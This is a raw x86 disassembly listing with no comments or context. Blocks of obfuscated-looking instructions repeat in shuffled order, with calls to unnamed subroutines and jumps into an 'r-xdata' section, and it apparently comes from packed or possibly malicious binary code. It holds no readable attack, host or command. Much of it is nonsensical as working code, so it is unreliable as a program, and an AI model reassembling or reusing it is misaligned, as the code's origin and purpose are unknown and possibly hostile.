xor eax 0xff56850f
push esi
call sub_402ef4
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jae r-xdata
or esi 0x937f5959
call sub_402ec3
sub ebx 0xa3642773
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c13ddd
jae r-xdata
pop edx
jns r-xdata
sub edx 0xee815d71
jno r-xdata
mov esp 0xd2775a59
jg r-xdata
jge 0xffffffffc009a494
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
jns r-xdata
jmp 0x1001689
push eax
push ecx
sub esp 0x10
call sub_402ea5
jo 0xffffffffff29bc66
or esi 0xf04c483
xor ebp 0xfffffffe
jge r-xdata
js 0x59753b97
jae r-xdata
or eax 0x15ff2875
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jne r-xdata
jpe 0x18c33e60
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
jg r-xdata
jl 0xe24a24d
jae r-xdata
or eax 0x8d0fb671
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
jne r-xdata
jl 0xffffffffa1a4c109
jg r-xdata
jge 0x18ab47e
pop ecx
add eax 0xfefc8d0f
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
pop ecx
jg r-xdata
sub ecx 0xce819d75
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
pop ecx
jae r-xdata
jns r-xdata
mov ecx 0x59054979
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
call 0xffffffffcec170ed
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
jae r-xdata
jo 0xc6473e2
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_403022
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jge r-xdata
call sub_402eb6
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
add esp 0x4
ja r-xdata
jge 0x100b31c
jns r-xdata
add esi 0x99870f
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
pop eax
jg r-xdata
jne 0xffffffffe7c21d66
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1f1c2
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
jns r-xdata
xor esi 0x76795a59
jb 0x120b2b9
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c14775
jae r-xdata
jpo 0x362887bb
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe728880b
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_403045
call [ 0xfffffffff281d277 ]
je 0xffffffffff82b971
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_402f73
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101ba360
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a87d0
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_40307e
sub esi 0xe92e7f58
push esp
push edi
call sub_402fa0
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
jno 0xffffffffff13b7eb
jmp [ esp + 0x18 ]
or eax 0xfef5830f
mov eax 0xff64870f
sub_402ec3
jg r-xdata
pop eax
pop ecx
jge r-xdata
jns 0xffffffff8202a825
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
retn
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
pop ecx
add eax 0xfefc8d0f
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
pop edx
jne r-xdata
ja 0xffffffffe85badcf
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c13ddd
jae r-xdata
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jno r-xdata
mov esp 0xd2775a59
jne r-xdata
push eax
push ecx
sub esp 0x10
call sub_402ea5
jo 0xffffffffff29bc66
or esi 0xf04c483
xor ebp 0xfffffffe
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
jge r-xdata
js 0x59753b97
jae r-xdata
or eax 0x15ff2875
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
jns r-xdata
call sub_402ec3
sub ebx 0xa3642773
add ebx 0x9c575756
pop ecx
jae r-xdata
mov ecx 0x59054979
push esi
call sub_402ef4
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop edx
jns r-xdata
sub edx 0xee815d71
jg r-xdata
jge 0x18ab47e
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
add esp 0x4
jae r-xdata
jmp [ 0xc4830f ]
jns r-xdata
jmp 0x1001689
jne r-xdata
jpe 0x18c33e60
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
call 0xffffffffcec170ed
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
jae r-xdata
or eax 0x8d0fb671
jl 0xffffffffa1a4c109
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1e230
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_403022
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jne r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
pop edx
jae r-xdata
xor edi 0x5c775a59
pop ecx
pop edx
ja r-xdata
pop eax
jno r-xdata
add esp 0x4
ja r-xdata
jge 0x100b31c
jns r-xdata
add esi 0x99870f
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
or esi 0x890f537f
jge r-xdata
sub edx 0xf281e771
pop eax
jg r-xdata
jne 0xffffffffe7c21d66
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1f1c2
jae r-xdata
or esi 0x937f5959
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1cc14
jns r-xdata
xor esi 0x76795a59
jb 0x120b2b9
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jno r-xdata
xor eax 0xff56850f
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c14775
jae r-xdata
jpo 0x362887bb
jg r-xdata
jge 0xffffffffc009a494
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe728880b
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_403045
call [ 0xfffffffff281d277 ]
je 0xffffffffff82b971
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jg r-xdata
jl 0xe24a24d
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_402f73
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101ba360
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a87d0
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_40307e
sub esi 0xe92e7f58
push esp
push edi
call sub_402fa0
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
jno r-xdata
jno 0xffffffffff13b7eb
jmp [ esp + 0x18 ]
or eax 0xfef5830f
jae r-xdata
jo 0xc6473e2
mov eax 0xff64870f
jge r-xdata
call sub_402eb6
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
pop ecx
jno r-xdata
xor esi 0xe381807d
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
sub_402ef4
jne r-xdata
jns r-xdata
call [ 0xffffffffea81cd7d ]
pop edx
jae r-xdata
jo 0xffffffffcec14ea3
add [ esp + 0xc ] 0x6
sub esi 0x8a0f8677
pop edx
jne r-xdata
ja 0xffffffffe85badcf
add esp 0x4
jae r-xdata
jg r-xdata
jge 0x18ab47e
pop ecx
add eax 0xfefc8d0f
push esi
push edi
push edi
pushfd
jo 0xffffffffa0c13ddd
jae r-xdata
jae r-xdata
or eax 0x8d0fb671
jae r-xdata
add edx 0xffa5e89c
add [ eax ] al
pushfd
push esp
push esi
push esi
sub edi 0xad830f
add [ eax ] al
pop edx
jno r-xdata
mov esp 0x83ba5c73
les ecx [ eax ]
jae r-xdata
add [ eax ] al
add [ ecx + 0xfec75f6 ] al
jns r-xdata
or esi 0xf4f755a
sbb [ edx + 0xf ] 0x81
mov al [ 0xffffffff81000000 ]
div [ ebp - 0x14 ]
jns r-xdata
jmp 0x1001689
pop eax
jae r-xdata
mov edi 0xf35f675
test [ esi - 0x1 ] edx
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
jns r-xdata
xor esi 0x8c0fec75
pop edx
pop ecx
jne r-xdata
xor edx 0x8c0fbf7f
jno r-xdata
mov esp 0xd2775a59
jne r-xdata
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_403022
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
push eax
push ecx
sub esp 0x10
call sub_402ea5
jo 0xffffffffff29bc66
or esi 0xf04c483
xor ebp 0xfffffffe
jae r-xdata
mov eax [ fs : 0x79b95e75 ]
dec ecx
jge r-xdata
js 0x59753b97
jae r-xdata
or eax 0x15ff2875
jns r-xdata
call sub_402ec3
sub ebx 0xa3642773
add ebx 0x9c575756
pop ecx
jae r-xdata
mov ecx 0x59054979
add esp 0x4
ja r-xdata
jge 0x100b31c
jns r-xdata
add esi 0x99870f
push esi
call sub_402ef4
sub eax 0xc9811c71
xor eax 0x81247359
out dx eax
jns r-xdata
pop ecx
and ebx 0x1c7d5958
jae r-xdata
ja r-xdata
mov [ fs : 0x73bca279 ] eax
pop esp
pop edx
jns r-xdata
sub edx 0xee815d71
pop ecx
jg r-xdata
sub ecx 0xce819d75
pop ecx
pop ecx
jg r-xdata
pop eax
jg r-xdata
jne 0xffffffffe7c21d66
add [ eax ] al
jae r-xdata
jbe 0xfffffffff2c1f1c2
jmp [ 0xc4830f ]
jne r-xdata
jpe 0x18c33e60
call 0xffffffffcec170ed
jno r-xdata
add ecx 0x8d0f3a7d
jne r-xdata
jns r-xdata
xor esi 0x76795a59
jb 0x120b2b9
ja r-xdata
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
jl 0xffffffffa1a4c109
pop edx
jg r-xdata
or ecx 0xea830f
add [ eax ] al
pop ecx
pop edx
ja r-xdata
ja 0xffffffffc2c1e230
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jne r-xdata
sub eax 0xf04c483
sub eax 0x81000000
into
xor edi 0x5c775a59
pop ecx
pop edx
ja r-xdata
pop eax
jno r-xdata
jae r-xdata
sub edi 0xff5b8d0f
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c14775
jae r-xdata
jpo 0x362887bb
jne r-xdata
mov eax [ fs : 0xffffffffec835150 ]
adc al ch
push esp
jns r-xdata
or esi 0x890f537f
jge r-xdata
sub edx 0xf281e771
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
jmp 0xffffffffe728880b
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_403045
call [ 0xfffffffff281d277 ]
je 0xffffffffff82b971
jae r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
jae r-xdata
or esi 0x937f5959
jae r-xdata
add eax 0x81d97959
jmp 0xffffffffcec1cc14
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
jmp [ 0x182464ff ]
jae r-xdata
add ebx 0x840f3e7f
sub esp 0x18
call sub_402f73
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101ba360
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
jne r-xdata
mov edx 0xf08c483
sub [ edi + edi * 8 ] 0xffffffff
inc [ ecx + 0xfbf7ff2 ]
mov [ ecx + 0x73 ] ds
in al 0xd
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a87d0
lea ecx [ edi ]
add eax 0x0
pushfd
push eax
call sub_40307e
sub esi 0xe92e7f58
push esp
push edi
call sub_402fa0
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
jno r-xdata
xor eax 0xff56850f
jno r-xdata
jno 0xffffffffff13b7eb
jmp [ esp + 0x18 ]
or eax 0xfef5830f
jg r-xdata
jge 0xffffffffc009a494
mov eax 0xff64870f
jg r-xdata
jl 0xe24a24d
add esp 0x4
jno r-xdata
add edx 0x81447158
0xf281e771 0x4079
jge r-xdata
or esi 0xf0a735a
xchg [ ecx + 0x7f ] ebx
sbb ebp eax
jae r-xdata
jo 0xc6473e2
jge r-xdata
call sub_402eb6
sub eax 0xe48f0f5a
add [ eax ] al
add [ ecx + 0x775a59f7 ] al
pop esp
xor ecx 0x5656549c
sub esp 0x1c
jge r-xdata
push es
pop ecx
jno r-xdata
xor esi 0xe381807d
pop eax
pop ecx
jge r-xdata
or eax 0x850f595a
test [ eax ] 0x0
add [ edi ] cl
mov [ ebx + 0xd ] dh
pop eax
jne r-xdata
mov eax [ fs : 0xffffffffff49890f ]
sub_402f73
pop ecx
pop eax
pop edx
pop edx
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jns r-xdata
add esi 0x99870f
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
jae r-xdata
jbe 0xfffffffff2c1f1c2
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_403022
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
pop edx
jg r-xdata
or edx 0xf8810f
add [ eax ] al
add esp 0x4
ja r-xdata
jge 0x100b31c
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
pop eax
jg r-xdata
jne 0xffffffffe7c21d66
add [ eax ] al
jae r-xdata
jpo 0x362887bb
jns r-xdata
xor esi 0x76795a59
jb 0x120b2b9
ja r-xdata
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
pop edx
jno r-xdata
and ecx 0xff69830f
add [ eax ] al
ja r-xdata
mov edi 0xcf81337f
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
sub esp 0x18
call sub_402f73
add edx 0x79810f59
add eax 0xff0e830f
jae r-xdata
sub edi 0xff5b8d0f
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
mov ah 0xf
test [ ecx - 0x13 ] edi
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jg r-xdata
jge 0xffffffffe1c14775
pushfd
push eax
call sub_40307e
sub esi 0xe92e7f58
push esp
push edi
call sub_402fa0
and eax 0xf0d2b73
xor ebp 0xfffffffe
mov esp 0xc4835a58
add al 0x73
dec eax
ja r-xdata
jmp 0xffffffffe728880b
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_403045
call [ 0xfffffffff281d277 ]
je 0xffffffffff82b971
jae r-xdata
jae r-xdata
jmp [ 0x182464ff ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
jae r-xdata
add ebx 0x840f3e7f
jne r-xdata
jne 0x101ba360
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a87d0
lea ecx [ edi ]
add eax 0x0
jno r-xdata
jno 0xffffffffff13b7eb
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
mov eax 0xff64870f
sub_402fa0
pop ecx
pop edx
jns r-xdata
jge r-xdata
jb 0x120b2b9
jae r-xdata
or edx 0x59b9427f
add esp 0x8
ja r-xdata
add [ eax ] al
add esp 0x4
ja r-xdata
jpo 0xfcb292
jns r-xdata
or esi 0xa5810f
add [ eax ] al
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
jno r-xdata
sub edx 0x57e85254
add [ eax ] al
add [ ecx + 0x5a7f58c7 ] al
add [ eax ] al
add esp 0x8
jae r-xdata
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jae r-xdata
jbe 0xfffffffff2c1f1c2
ja r-xdata
jmp 0xffffffffe728880b
jns r-xdata
add esi 0x99870f
ja r-xdata
add esi 0xc7817c73
add esp 0x4
jne r-xdata
mov ah 0xf
test [ ecx - 0x13 ] edi
mov esi 0x7704c483
pop edx
or edx 0xf8810f
add [ eax ] al
jae r-xdata
jmp [ 0x182464ff ]
jno r-xdata
and edx 0xff23870f
jae r-xdata
mov eax 0xe3795858
jns r-xdata
add [ eax ] al
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
push esp
push edi
call sub_402fa0
and eax 0xf0d2b73
xor ebp 0xfffffffe
add edi 0xff6e890f
jae r-xdata
jpo 0x362887bb
jno r-xdata
jno 0xffffffffff13b7eb
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
ja r-xdata
mov eax 0xff64870f
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
sub esp 0x18
call sub_402f73
add edx 0x79810f59
add eax 0xff0e830f
ja r-xdata
mov edi 0xcf81337f
pushfd
push eax
call sub_40307e
sub esi 0xe92e7f58
mov esp 0xc4835a58
add al 0x73
dec eax
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
jg r-xdata
jge 0xffffffffe1c14775
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
pushfd
call sub_403045
call [ 0xfffffffff281d277 ]
je 0xffffffffff82b971
jae r-xdata
jae r-xdata
add ebx 0x840f3e7f
jne r-xdata
jne 0x101ba360
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
jae r-xdata
jpo 0x5a9a87d0
lea ecx [ edi ]
add eax 0x0
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
jg r-xdata
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_403022
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
add esp 0x4
ja r-xdata
jge 0x100b31c
pop eax
jg r-xdata
jne 0xffffffffe7c21d66
add [ eax ] al
jns r-xdata
xor esi 0x76795a59
pop edx
jno r-xdata
and ecx 0xff69830f
jae r-xdata
sub edi 0xff5b8d0f
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
sub_402ff0
jg r-xdata
pop ecx
add esp 0x8
ja r-xdata
or edi 0x8d0f647d
jns r-xdata
or esi 0xa5810f
add [ eax ] al
add esi 0xc7817c73
pop edx
jno r-xdata
and ecx 0xff69830f
add esp 0x8
jae r-xdata
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jae r-xdata
jbe 0xfffffffff2c1f1c2
jae r-xdata
sub edi 0xff5b8d0f
add esp 0x4
jne r-xdata
mov esi 0x7704c483
pop edx
or edx 0xf8810f
add [ eax ] al
jge r-xdata
add eax 0xe818ec83
cmpsb [ esi ] [ edi ]
jae r-xdata
mov eax 0xe3795858
jns r-xdata
mov ah 0xf
test [ ecx - 0x13 ] edi
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jns r-xdata
add [ eax ] al
add esi 0x99870f
jge r-xdata
pop edx
jno r-xdata
mov ecx 0x5abb3e73
push esp
push edi
call sub_402fa0
and eax 0xf0d2b73
xor ebp 0xfffffffe
add edi 0xff6e890f
jae r-xdata
jpo 0x362887bb
jg r-xdata
jge 0xffffffffe1c14775
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
pushfd
call sub_403045
call [ 0xfffffffff281d277 ]
je 0xffffffffff82b971
jae r-xdata
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
sub esp 0x18
call sub_402f73
add edx 0x79810f59
add eax 0xff0e830f
jne r-xdata
jne 0x101ba360
pushfd
push eax
call sub_40307e
sub esi 0xe92e7f58
mov esp 0xc4835a58
add al 0x73
dec eax
ja r-xdata
jmp 0xffffffffe728880b
jae r-xdata
jpo 0x5a9a87d0
lea ecx [ edi ]
add eax 0x0
jae r-xdata
jmp [ 0x182464ff ]
jmp [ esp + 0x18 ]
or eax 0xfef5830f
ja r-xdata
pop ecx
jno r-xdata
sub ecx 0xa6810f5a
add [ eax ] al
add [ ecx + 0x5b8d0fef ] al
jg r-xdata
pop ecx
pop eax
pop eax
or esi 0x8b0f0a73
jae r-xdata
jno r-xdata
jno 0xffffffffff13b7eb
jge r-xdata
xor esi 0xf04c483
xchg [ ebp - 0x7f000000 ] ebx
0x57e85254 0x0
ja r-xdata
mov eax 0xff64870f
pop eax
jae r-xdata
xor edx 0x9c579c55
call sub_403022
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
ja r-xdata
mov edi 0xcf81337f
add esp 0x4
ja r-xdata
jge 0x100b31c
pop edx
jae r-xdata
mov [ fs : 0xf08c483 ] eax
and [ ebp - 0x42000000 ] 0xffffff83
les eax [ edi + esi * 2 ]
pop eax
jg r-xdata
jne 0xffffffffe7c21d66
add [ eax ] al
ja r-xdata
sub eax 0x58bc3177
pop edx
add esp 0x4
jae r-xdata
jns r-xdata
xor esi 0x76795a59
jb 0x120b2b9
jae r-xdata
add ebx 0x840f3e7f
add [ eax ] al
xchg edi eax
add [ eax ] al
add [ ecx + 0x585859c6 ] al
mov ebx 0x810f5a5a
sub_403022
jg r-xdata
push ecx
push edi
call sub_4030a2
or ebx 0x2de0735a
mov ecx 0x8c48359
ja r-xdata
pushfd
push eax
call sub_40307e
sub esi 0xe92e7f58
mov esp 0xc4835a58
add al 0x73
dec eax
jns r-xdata
or esi 0xa5810f
add [ eax ] al
add esi 0xc7817c73
add esp 0x8
jae r-xdata
and edi 0x7fbfe177
xor eax [ ecx + 0xf647dcf ]
lea edi [ ecx + 0x17 ]
jae r-xdata
jbe 0xfffffffff2c1f1c2
add esp 0x4
jne r-xdata
mov esi 0x7704c483
pop edx
or edx 0xf8810f
add [ eax ] al
jae r-xdata
mov eax 0xe3795858
jns r-xdata
mov ah 0xf
test [ ecx - 0x13 ] edi
add esi 0x7f585859
imul eax [ ecx - 0x6678f03a ] 0x0
jns r-xdata
add [ eax ] al
add esi 0x99870f
push esp
push edi
call sub_402fa0
and eax 0xf0d2b73
xor ebp 0xfffffffe
add edi 0xff6e890f
jae r-xdata
jpo 0x362887bb
pop eax
pop eax
jns r-xdata
mov eax 0xca811073
jno r-xdata
add [ eax ] al
add [ ecx - 0x1f8ca535 ] al
ja r-xdata
jmp [ 0xfffffffffee78f0f ]
pop eax
jg r-xdata
sub esi 0x73b9397d
mov ebx 0x810f5a5a
sub esp 0x18
call sub_402f73
add edx 0x79810f59
add eax 0xff0e830f
ja r-xdata
jmp 0xffffffffe728880b
jae r-xdata
jmp [ 0x182464ff ]
pop ecx
jno r-xdata
